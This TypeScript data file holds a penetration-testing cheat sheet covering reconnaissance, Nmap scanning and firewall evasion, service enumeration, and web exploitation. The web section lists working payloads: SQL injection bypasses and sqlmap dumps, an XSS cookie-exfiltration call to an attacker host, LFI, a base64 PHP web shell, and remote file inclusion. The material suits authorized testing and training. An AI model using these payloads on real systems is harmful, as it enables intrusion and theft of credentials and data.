...
export const masterCheatSheet: CheatCategory[] = [
  ...
  // ═══════════════════════════════════════════════
  {
    ...
    icon: '🔍',
    description: 'Passive and active intelligence gathering before engaging targets.',
    sections: [
      {
        title: 'DNS Enumeration',
        commands: [
          { cmd: 'dig axfr @<DNS_SERVER> <DOMAIN>', desc: 'Attempt DNS zone transfer' },
          { cmd: 'dig ANY <DOMAIN>', desc: 'Query all DNS record types' },
          { cmd: 'dig +short mx <DOMAIN>', desc: 'Get mail exchange records' },
          { cmd: 'dig +short ns <DOMAIN>', desc: 'Get nameserver records' },
          { cmd: 'dig +short txt <DOMAIN>', desc: 'Get TXT records (SPF, DKIM, etc.)' },
          { cmd: 'host -t any <DOMAIN>', desc: 'All records via host command' },
          { cmd: 'nslookup -type=any <DOMAIN>', desc: 'Query all record types via nslookup' },
          { cmd: 'dnsrecon -d <DOMAIN> -t std', desc: 'Standard DNS enumeration' },
          { cmd: 'dnsrecon -d <DOMAIN> -t brt -D /usr/share/wordlists/dnsmap.txt', desc: 'DNS brute-force subdomains' },
          { cmd: 'dnsenum <DOMAIN>', desc: 'Comprehensive DNS enumeration' },
          { cmd: 'fierce --domain <DOMAIN>', desc: 'DNS reconnaissance and subdomain scanner' },
        ],
      },
      {
        title: 'Subdomain Enumeration',
        commands: [
          { cmd: 'subfinder -d <DOMAIN> -o subs.txt', desc: 'Fast passive subdomain finder' },
          { cmd: 'amass enum -d <DOMAIN>', desc: 'In-depth subdomain enumeration' },
          { cmd: 'assetfinder --subs-only <DOMAIN>', desc: 'Find subdomains from various sources' },
          { cmd: 'gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', desc: 'Brute-force subdomains with Gobuster' },
          { cmd: 'ffuf -u https://FUZZ.<DOMAIN> -w wordlist.txt -mc 200', desc: 'Fuzz subdomains with FFUF' },
          { cmd: 'curl -s "https://crt.sh/?q=%25.<DOMAIN>&output=json" | jq -r ".[].name_value" | sort -u', desc: 'Certificate transparency log search' },
        ],
      },
      {
        title: 'WHOIS & IP Intel',
        commands: [
          { cmd: 'whois <DOMAIN>', desc: 'WHOIS lookup for domain registration info' },
          { cmd: 'whois <IP>', desc: 'IP WHOIS lookup for ASN and netblock' },
          { cmd: 'curl ipinfo.io/<IP>', desc: 'Get IP geolocation and ASN info' },
          { cmd: 'theHarvester -d <DOMAIN> -b all', desc: 'Harvest emails, subdomains, IPs from public sources' },
          { cmd: 'shodan host <IP>', desc: 'Shodan host info (open ports, services, vulns)' },
          { cmd: 'shodan search "hostname:<DOMAIN>"', desc: 'Search Shodan for domain assets' },
          { cmd: 'whatweb <URL>', desc: 'Identify web technologies used on a website' },
          { cmd: 'wafw00f <URL>', desc: 'Detect Web Application Firewalls' },
        ],
      },
      {
        title: 'Google Dorks',
        commands: [
          { cmd: 'site:<DOMAIN> filetype:pdf', desc: 'Find PDF files on a domain' },
          { cmd: 'site:<DOMAIN> inurl:admin', desc: 'Find admin pages' },
          { cmd: 'site:<DOMAIN> intitle:"index of"', desc: 'Find directory listings' },
          { cmd: 'site:<DOMAIN> ext:sql | ext:db | ext:log', desc: 'Find database and log files' },
          { cmd: 'site:<DOMAIN> intext:"password" filetype:log', desc: 'Find passwords in log files' },
          { cmd: '"<DOMAIN>" inurl:wp-content', desc: 'Detect WordPress installations' },
          { cmd: 'inurl:"/phpinfo.php" site:<DOMAIN>', desc: 'Find exposed PHP info pages' },
        ],
      },
    ],
  },
  ...
  // ═══════════════════════════════════════════════
  {
    ...
    icon: '📡',
    description: 'Active scanning to discover hosts, ports, services, and vulnerabilities.',
    sections: [
      {
        title: 'Nmap — Host Discovery',
        commands: [
          { cmd: 'nmap -sn <SUBNET>/24', desc: 'Ping sweep — discover live hosts' },
          { cmd: 'nmap -sn -PA <SUBNET>/24', desc: 'TCP ACK ping sweep (bypasses ICMP blocks)' },
          { cmd: 'nmap -sn -PS22,80,443 <SUBNET>/24', desc: 'TCP SYN ping on specific ports' },
          { cmd: 'nmap -sn -PU <SUBNET>/24', desc: 'UDP ping sweep' },
          { cmd: 'nmap -Pn <TARGET>', desc: 'Skip host discovery, treat host as up' },
        ],
      },
      {
        title: 'Nmap — Port Scanning',
        commands: [
          { cmd: 'nmap -sS <TARGET>', desc: 'TCP SYN stealth scan (default, fast, stealthy)' },
          { cmd: 'nmap -sT <TARGET>', desc: 'TCP Connect scan (full 3-way handshake)' },
          { cmd: 'nmap -sU <TARGET>', desc: 'UDP scan (slow but critical for DNS/SNMP/TFTP)' },
          { cmd: 'nmap -p- <TARGET>', desc: 'Scan all 65535 TCP ports' },
          { cmd: 'nmap -p 1-1000 <TARGET>', desc: 'Scan port range 1—1000' },
          { cmd: 'nmap -sV <TARGET>', desc: 'Service version detection' },
          { cmd: 'nmap -sC <TARGET>', desc: 'Run default NSE scripts' },
          { cmd: 'nmap -A <TARGET>', desc: 'Aggressive scan (OS, version, scripts, traceroute)' },
          { cmd: 'nmap -O <TARGET>', desc: 'OS fingerprinting' },
          { cmd: 'nmap -sS -sV -sC -O -p- -T4 <TARGET> -oA full_scan', desc: 'Full comprehensive scan with output' },
          { cmd: 'nmap --top-ports 100 <TARGET>', desc: 'Scan top 100 most common ports' },
        ],
      },
      {
        title: 'Nmap — Firewall Evasion',
        commands: [
          { cmd: 'nmap -f <TARGET>', desc: 'Fragment packets to evade firewalls' },
          { cmd: 'nmap -D RND:10 <TARGET>', desc: 'Decoy scan with 10 random decoys' },
          { cmd: 'nmap --source-port 53 <TARGET>', desc: 'Spoof source port (DNS)' },
          { cmd: 'nmap -S <SPOOFED_IP> -e eth0 <TARGET>', desc: 'Spoof source IP address' },
          { cmd: 'nmap --data-length 25 <TARGET>', desc: 'Append random data to packets' },
          { cmd: 'nmap -sN <TARGET>', desc: 'TCP NULL scan (no flags set)' },
          { cmd: 'nmap -sF <TARGET>', desc: 'TCP FIN scan' },
          { cmd: 'nmap -sX <TARGET>', desc: 'TCP Xmas scan (FIN+PSH+URG)' },
        ],
      },
      {
        ...
        commands: [
          ...
          { cmd: 'nmap --script=http-enum <TARGET>', desc: 'Enumerate web directories' },
          { cmd: 'nmap --script=smb-vuln* <TARGET>', desc: 'Check for SMB vulnerabilities (EternalBlue etc.)' },
          { cmd: 'nmap --script=ftp-anon <TARGET>', desc: 'Check for anonymous FTP access' },
          { cmd: 'nmap --script=ssl-heartbleed <TARGET>', desc: 'Check for Heartbleed vulnerability' },
          { cmd: 'nmap -p 445 --script=smb-enum-shares <TARGET>', desc: 'Enumerate SMB shares' },
          { cmd: 'nmap -p 3306 --script=mysql-info <TARGET>', desc: 'Get MySQL server information' },
          { cmd: 'ls /usr/share/nmap/scripts/ | grep <KEYWORD>', desc: 'Search for available NSE scripts' },
        ],
      },
      {
        title: 'Service Enumeration',
        commands: [
          { cmd: 'enum4linux -a <TARGET>', desc: 'Full SMB/NetBIOS enumeration' },
          { cmd: 'smbclient -L //<TARGET> -N', desc: 'List SMB shares (null session)' },
          { cmd: 'smbmap -H <TARGET>', desc: 'SMB share permissions mapping' },
          { cmd: 'rpcclient -U "" <TARGET> -N', desc: 'RPC null session connection' },
          { cmd: 'snmpwalk -v2c -c public <TARGET>', desc: 'SNMP walk with community string' },
          { cmd: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET>', desc: 'SNMP community string brute-force' },
          { cmd: 'ldapsearch -x -H ldap://<TARGET> -b "dc=<DOMAIN>,dc=com"', desc: 'LDAP enumeration' },
          { cmd: 'smtp-user-enum -M VRFY -U users.txt -t <TARGET>', desc: 'SMTP user enumeration' },
          { cmd: 'finger @<TARGET>', desc: 'Finger protocol user enumeration' },
        ],
      },
    ],
  },
  ...
  // ═══════════════════════════════════════════════
  {
    ...
    icon: '🌐',
    description: 'SQL injection, XSS, LFI/RFI, directory busting, and web exploitation.',
    sections: [
      {
        title: 'Directory & File Discovery',
        commands: [
          { cmd: 'gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt', desc: 'Directory brute-force with extensions' },
          { cmd: 'feroxbuster -u <URL> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt', desc: 'Recursive directory discovery' },
          { cmd: 'ffuf -u <URL>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302', desc: 'Fast web fuzzer' },
          { cmd: 'dirb <URL> /usr/share/wordlists/dirb/big.txt', desc: 'Classic directory brute-force' },
          { cmd: 'wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 <URL>/FUZZ', desc: 'Web fuzzer with status code filter' },
          { cmd: 'nikto -h <URL>', desc: 'Web server vulnerability scanner' },
        ],
      },
      {
        title: 'SQL Injection',
        commands: [
          { cmd: "sqlmap -u '<URL>?id=1' --dbs", desc: 'Enumerate databases' },
          { cmd: "sqlmap -u '<URL>?id=1' -D <DB> --tables", desc: 'Enumerate tables in a database' },
          { cmd: "sqlmap -u '<URL>?id=1' -D <DB> -T <TABLE> --dump", desc: 'Dump table contents' },
          { cmd: "sqlmap -u '<URL>?id=1' --os-shell", desc: 'Attempt to get an OS shell' },
          { cmd: "sqlmap -r request.txt --batch --level 5 --risk 3", desc: 'Full SQLi test from Burp request file' },
          { cmd: "' OR 1=1 --", desc: 'Classic auth bypass payload' },
          { cmd: "' OR '1'='1' /*", desc: 'Alternative auth bypass' },
          { cmd: "' UNION SELECT NULL,NULL,NULL--", desc: 'Union-based column count test' },
          { cmd: "1' AND (SELECT SLEEP(5))--", desc: 'Time-based blind SQLi test' },
        ],
      },
      {
        title: 'Cross-Site Scripting (XSS)',
        commands: [
          { cmd: '<script>alert(1)</script>', desc: 'Basic reflected XSS test' },
          { cmd: '<img src=x onerror=alert(1)>', desc: 'Event handler XSS' },
          { cmd: '<svg onload=alert(1)>', desc: 'SVG-based XSS' },
          { cmd: 'javascript:alert(document.cookie)', desc: 'Cookie stealing via JS protocol' },
          { cmd: '"><script>alert(String.fromCharCode(88,83,83))</script>', desc: 'Attribute breakout XSS' },
          { cmd: '<img src=x onerror="fetch(\'https://<ATTACKER>/?\'+document.cookie)">', desc: 'Cookie exfiltration payload' },
          { cmd: "dalfox url <URL> -b <CALLBACK>", desc: 'Automated XSS scanner with callback' },
        ],
      },
      {
        title: 'Local/Remote File Inclusion',
        commands: [
          { cmd: '<URL>?page=../../../../etc/passwd', desc: 'Basic LFI to read /etc/passwd' },
          { cmd: '<URL>?page=....//....//....//etc/passwd', desc: 'LFI with double-encoding bypass' },
          { cmd: '<URL>?page=php://filter/convert.base64-encode/resource=index.php', desc: 'PHP filter wrapper to read source code' },
          { cmd: '<URL>?page=php://input', desc: 'PHP input wrapper for RCE (POST body = PHP code)' },
          { cmd: '<URL>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', desc: 'Data wrapper RCE (base64 PHP shell)' },
          { cmd: '<URL>?page=http://<ATTACKER>/shell.php', desc: 'Remote File Inclusion' },
          { cmd: '<URL>?page=/var/log/apache2/access.log', desc: 'Log poisoning for LFI to RCE' },
          { cmd: '<URL>?page=/proc/self/environ', desc: 'Environment variable injection' },
        ],
      },
      {
        title: 'WordPress Attacks',
        commands: [
          { cmd: 'wpscan --url <URL> --enumerate u,vp,vt,dbe', desc: 'Full WordPress enumeration' },
          { cmd: 'wpscan --url <URL> --passwords /usr/share/wordlists/rockyou.txt --usernames admin', desc: 'WordPress password brute-force' },
          { cmd: 'wpscan --url <URL> --api-token <TOKEN> --enumerate vp', desc: 'Scan for vulnerable plugins with API' },
        ],
      },
    ],
  },
